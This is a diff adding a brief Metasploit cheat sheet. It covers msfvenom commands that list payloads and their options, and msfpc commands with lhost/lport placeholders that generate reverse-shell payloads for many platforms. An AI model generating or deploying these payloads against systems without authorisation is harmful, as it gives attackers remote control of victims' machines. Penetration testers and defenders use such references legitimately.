@@ -1,0 +1,31 @@
+List all payloads 
+$ msfvenom -l payloads >payload.txt 
+
+#cat payload.txt |grep android
+#cat payload.txt |grep windows
+#cat payload.txt |grep linux
+#cat payload.txt |grep mac
+
+#Payload information
+$ msfvenom -p PAYLOAD-NAME --list-options
+
+$ msfvenom --list platforms
+$ msfvenom --list formats
+$ msfvenom --list archs
+$ msfvenom --list encrypt
+
+#Generate rc file with Metasploit palyad
+#MSFPC
+$ msfpc apk lhost lport
+$ msfpc asp lhost lport
+$ msfpc aspx lhost lport
+$ msfpc bash lhost lport
+$ msfpc java lhost lport
+$ msfpc linux lhost lport
+$ msfpc osx lhost lport
+$ msfpc perl lhost lport
+$ msfpc php lhost lport
+$ msfpc powershell lhost lport
+$ msfpc python lhost lport
+$ msfpc tomcat lhost lport
+$ msfpc windows lhost lport
